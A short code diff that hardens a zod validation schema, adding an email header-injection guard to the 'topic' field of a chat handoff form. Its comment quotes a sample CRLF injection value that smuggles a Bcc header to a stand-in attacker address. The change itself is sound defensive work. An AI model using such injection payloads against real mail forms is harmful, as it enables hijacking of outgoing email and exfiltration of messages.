@@ -51,7 +51,12 @@ export const ChatHandoffSchema = z.object({
   message: z.string().max(5000).pipe(z.string().trim().min(1)),
   summary: z
     .object({
-      topic: z.string().max(200).optional(),
+      // `topic` is interpolated into the email subject line — same CRLF
+      // defence-in-depth `name`/`email` get. Without it, an attacker
+      // submitting `topic: "Quote request\r\nBcc: exfil@evil.com"` could
+      // attempt SMTP header injection if Resend's downstream sanitisation
+      // ever regresses or the transport changes.
+      topic: z.string().max(200).pipe(NoHeaderInjection).optional(),
       tried: z.string().max(2000).optional(),
       question: z.string().max(2000).optional(),
     })
